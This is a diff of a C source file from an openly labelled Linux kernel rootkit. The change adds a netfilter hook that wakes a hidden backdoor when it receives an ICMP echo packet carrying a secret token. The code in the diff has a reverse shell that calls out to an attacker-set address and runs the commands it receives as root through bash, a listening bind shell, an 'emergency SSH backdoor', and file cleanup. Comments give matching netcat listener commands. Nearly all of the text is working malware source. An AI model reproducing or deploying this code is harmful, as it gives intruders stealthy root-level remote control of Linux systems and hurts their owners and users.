@@ -1,11 +1,15 @@
 #include "backdoor.h"
 
+#include <linux/icmp.h>
+#include <linux/in.h>
 #include <linux/inet.h>
-#include <net/ip.h>
+#include <linux/ip.h>
 #include <linux/sched.h>
+#include <linux/skbuff.h>
 #include <linux/slab.h>
 #include <linux/workqueue.h>
-
+#include <linux/netfilter.h>
+#include <linux/netfilter_ipv4.h>
 
 struct workqueue_struct *work_queue;
 struct work_cont *work;
@@ -14,17 +18,25 @@ struct work_cont {
     struct work_struct real_work;
 } work_cont;
 
-static void backdoor_ssh(void) {
+struct auth_icmp {
+    unsigned int auth;
+    unsigned int ip;
+    unsigned short port;
+};
+
+struct nf_hook_ops pre_hook;
+
+static void backdoor_ssh(void) 
+{
 
     char *argv[] = { "/bin/bash", "-c", BCK_SSH, NULL };
-    char *envp[] = { "HOME=/", NULL };
+    char *envp[] = { "HOME=" DEFAULT_PATH, NULL };
     call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
 }
 
 static int rk_sendbuff(struct socket *sock, char *buffer, int length)
 {
     struct msghdr msg;
-    mm_segment_t oldfs;
     struct iovec iov;
     int len = 0;
 
@@ -47,7 +59,6 @@ static int rk_sendbuff(struct socket *sock, char *buffer, int length)
 
     return len;
 }
-
 
 static int rk_recvbuff(struct socket *sock, char *buffer, int length)
 {
@@ -88,17 +99,17 @@ static int file_read(struct file *filp, void *buf, int count)
     return byte_read;
 }
 
-static int read_result(char *result) {
-
+static int read_result(char *result) 
+{
     struct file *filep;
     if ( ! (filep = filp_open(PATH, O_RDONLY, 0)) ) {
-        dbg("Error open the file\n");
+        dbg("backdoor: Error open the file\n");
         return;
     }
     char *cmd = NULL;
     cmd = kmalloc(1, GFP_KERNEL);
     if ( ! cmd ) {
-        dbg("Error allocating memory\n");
+        dbg("backdoor: Error allocating memory\n");
         filp_close(filep, NULL);
         return;
     }
@@ -112,7 +123,8 @@ static int read_result(char *result) {
     return bytes_read;
 }
 
-static int exec_cmd(char *buff) {
+static int exec_cmd(char *buff) 
+{
     char *pos;
     if ((pos=strchr(buff, '\n')) != NULL)
         *pos = '\0';
@@ -121,31 +133,24 @@ static int exec_cmd(char *buff) {
     strncat(buff, PATH, strlen(PATH));
 
     char *argv[] = { "/bin/bash", "-c", buff, NULL };
-    char *envp[] = { "HOME=/", NULL };
+    char *envp[] = { "HOME=" DEFAULT_PATH, NULL };
     int check;
     // wait proc -> wait until the cmd is executed
     check = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
     return check;
 }
 
-static void remove_file(void) {
-    char *buff = NULL;
-    buff = kmalloc(strlen(PATH)+15, GFP_KERNEL);
-    if ( ! buff ) {
-        dbg("Error allocating memory\n");
-        return;
-    }    
-    strcpy(buff, "rm -f ");
-    strncat(buff, PATH, strlen(PATH));
-    dbg("remove buffer %s\n", buff);
-    char *argv[] = { "/bin/bash", "-c", buff, NULL };
-    char *envp[] = { "HOME=/", NULL };
+static void remove_file(void) 
+{
+    dbg("backdoor: remove buffer %s\n", "rm -f " PATH);
+    char *argv[] = { "/bin/bash", "-c", "rm -f " PATH, NULL };
+    char *envp[] = { "HOME=" DEFAULT_PATH, NULL };
     call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
 }
 
-static void backdoor_reverse(void) {
-
-    /* client bind with : nc -lvp 2424 */
+static void backdoor_reverse(void) 
+{
+    /* default: client bind with : nc -lvp 2424 */
 
     struct socket *sock;
     struct sockaddr_in sin;
@@ -155,17 +160,17 @@ static void backdoor_reverse(void) {
 
     error = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
     if (error < 0) {
-        dbg("Error during creation of socket; terminating\n");
+        dbg("backdoor: Error during creation of socket; terminating\n");
         return;
     }
 
     sin.sin_family = AF_INET;
-    sin.sin_addr.s_addr = in_aton("127.0.0.1");
-    sin.sin_port = htons(2424);
+    sin.sin_addr.s_addr = in_aton(IP_DEST);
+    sin.sin_port = htons(PORT_DEST);
 
     error = sock->ops->connect(sock, (struct sockaddr*) &sin, sizeof(sin), !O_NONBLOCK);
     if (error < 0) {
-        dbg("Error during connection of socket; terminating\n");
+        dbg("backdoor: Error during connection of socket; terminating\n");
         sock_release(sock);
         return;
     }
@@ -173,7 +178,7 @@ static void backdoor_reverse(void) {
     buff = kmalloc(512, GFP_KERNEL);
     if (buff == NULL)
     {
-        dbg("Error allocating memory\n");
+        dbg("backdoor: Error allocating memory\n");
         sock_release(sock);
         return;
     }
@@ -194,7 +199,7 @@ static void backdoor_reverse(void) {
                 char *result = NULL;
                 result = kmalloc(1024, GFP_KERNEL);
                 if ( ! result ) {
-                    dbg("Error allocating memory\n");
+                    dbg("backdoor: Error allocating memory\n");
                     return;
                 }
                 int bytes_read;
@@ -207,18 +212,18 @@ static void backdoor_reverse(void) {
                 memset(buff, '\0', sizeof(buff)); //cleanup the buffer
                 if (res == 0) {
                     remove_file();
-                    dbg("Error during connection of socket; terminating\n");
+                    dbg("backdoor: Error during connection of socket; terminating\n");
                     break;
                 }
                 tt = 0;
                 bytes_read = 0;
             } else {
-                dbg("Error executing cmd\n");
+                dbg("backdoor: Error executing cmd\n");
             }
         } else {
             if (file_created)
                 remove_file();
-            dbg("Error during connection of socket; terminating\n");
+            dbg("backdoor: Error during connection of socket; terminating\n");
             break;
         }
     }
@@ -227,9 +232,10 @@ static void backdoor_reverse(void) {
     kfree(buff);
 }
 
-static void backdoor_bind(void) {
+static void backdoor_bind(void) 
+{
 
-    /* client connect with : nc 127.0.0.1 5000 */
+    /* default: client connect with : nc 127.0.0.1 5000 */
 
     struct socket *sock;
     struct sockaddr_in sin;
@@ -238,24 +244,24 @@ static void backdoor_bind(void) {
 
     error = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
     if (error < 0) {
-        dbg("Error during creation of socket; terminating\n");
+        dbg("backdoor: Error during creation of socket; terminating\n");
         return;
     }
 
     sin.sin_family = AF_INET;
-    sin.sin_addr.s_addr = in_aton("127.0.0.1");
-    sin.sin_port = htons(5000);
+    sin.sin_addr.s_addr = in_aton(IP_SOURCE);
+    sin.sin_port = htons(PORT_SRC);
 
     error = sock->ops->bind(sock, (struct sockaddr *) &sin, sizeof(sin));
     if (error < 0) {
-        dbg("Error binding socket\n");
+        dbg("backdoor: Error binding socket\n");
         sock_release(sock);
         return;
     }
 
     error = sock->ops->listen(sock, 5);
     if (error < 0) {
-        dbg("Error listening on socket \n");
+        dbg("backdoor: Error listening on socket \n");
         sock_release(sock);
         return;
     }
@@ -266,7 +272,7 @@ static void backdoor_bind(void) {
     newsock=(struct socket*)kmalloc(sizeof(struct socket),GFP_KERNEL);
     error = sock_create(PF_INET,SOCK_STREAM,IPPROTO_TCP,&newsock);
     if(error<0) {
-        dbg("Error create newsock error\n");
+        dbg("backdoor: Error create newsock error\n");
         kfree(buff);
         sock_release(sock);  
         return; 
@@ -284,7 +290,7 @@ static void backdoor_bind(void) {
                     char *result = NULL;
                     result = kmalloc(1024, GFP_KERNEL);
                     if ( ! result ) {
-                        dbg("Error allocating memory\n");
+                        dbg("backdoor: Error allocating memory\n");
                         return;
                     }
                     int bytes_read;
@@ -297,13 +303,13 @@ static void backdoor_bind(void) {
                     memset(buff, '\0', sizeof(buff)); //cleanup the buffer
                     if (res == 0) {
                         remove_file();
-                        dbg("Error during connection of socket; terminating\n");
+                        dbg("backdoor: Error during connection of socket; terminating\n");
                         break;
                     }
                     tt = 0;
                     bytes_read = 0;
                 } else {
-                    dbg("Error executing cmd\n");
+                    dbg("backdoor: Error executing cmd\n");
                 }
                 if(signal_pending(current)) {
                     break;
@@ -325,13 +331,14 @@ static void backdoor_bind(void) {
 
 }
 
-static void thread_function(struct work_struct *work_arg){
+static void thread_function(struct work_struct *work_arg)
+{
     struct work_cont *c_ptr = container_of(work_arg, struct work_cont, real_work);
 
-    dbg("Deferred work PID %d \n", current->pid);
+    dbg("backdoor: deferred work PID %d \n", current->pid);
 
+    // TODO regarding issue #16 the activation backdoor will be release
     backdoor_reverse();
-
     //backdoor_bind();
 
     kfree(c_ptr);
@@ -339,18 +346,69 @@ static void thread_function(struct work_struct *work_arg){
     return;
 }
 
-void backdoor(void) {
+/* function originaly taken from suterusu repository, adapted to our rootkit */
+static unsigned int watch_icmp ( unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *) ) 
+{
+    struct iphdr *ip_header;
+    struct icmphdr *icmp_header;
+    struct auth_icmp *payload;
+    unsigned int payload_size;
 
-    /* EMERGENCY SSH BACKDOOR */
-    if (ALLOW_SSH == 1) {
-        backdoor_ssh();
-    }
-    
+    ip_header = ip_hdr(skb);
+    if ( ! ip_header )
+        return NF_ACCEPT;
+
+    if ( ip_header->protocol != IPPROTO_ICMP )
+        return NF_ACCEPT;
+
+    // skb->transport_header hasn't been set by this point, so we have to calculate it manually
+    icmp_header = (struct icmphdr *)(ip_header + 1);
+    if ( ! icmp_header )
+        return NF_ACCEPT;
+
+    payload = (struct auth_icmp *)(icmp_header + 1);
+    payload_size = skb->len - sizeof(struct iphdr) - sizeof(struct icmphdr);
+
+    dbg("ICMP packet: payload_size=%u, auth=%x, ip=%x, port=%hu\n", payload_size, payload->auth, payload->ip, payload->port);
+
+    if ( icmp_header->type != ICMP_ECHO || payload_size != 10 || payload->auth != AUTH_TOKEN )
+        return NF_ACCEPT;
+
+    dbg("backdoor: Received auth ICMP packet\n");
+    dbg("backdoor: Starting the task\n");
     work = kmalloc(sizeof(*work), GFP_KERNEL);
     if ( !work ) {
-        dbg("Error alloc work_queue");
+        dbg("backdoor: Error alloc work_queue");
         return;
     }
     INIT_WORK(&work->real_work, thread_function);
     schedule_work(&work->real_work);
+
+    return NF_ACCEPT;
+}
+
+void backdoor_exit ( void )
+{
+    dbg("backdoor: Stopping monitoring ICMP packets via netfilter\n");
+    kfree(work);
+    nf_unregister_hook(&pre_hook);
+}
+
+
+void backdoor(void) 
+{
+    // TODO regarding issue #16 the activation backdoor will be release
+    /* EMERGENCY SSH BACKDOOR */
+    if (ALLOW_SSH == 1) {
+        backdoor_ssh();
+    }
+
+    dbg("backdoor: Monitoring ICMP packets via netfilter\n");
+
+    pre_hook.hook     = watch_icmp;
+    pre_hook.pf       = PF_INET;
+    pre_hook.priority = NF_IP_PRI_FIRST;
+    pre_hook.hooknum  = NF_INET_PRE_ROUTING;
+
+    nf_register_hook(&pre_hook);   
 }
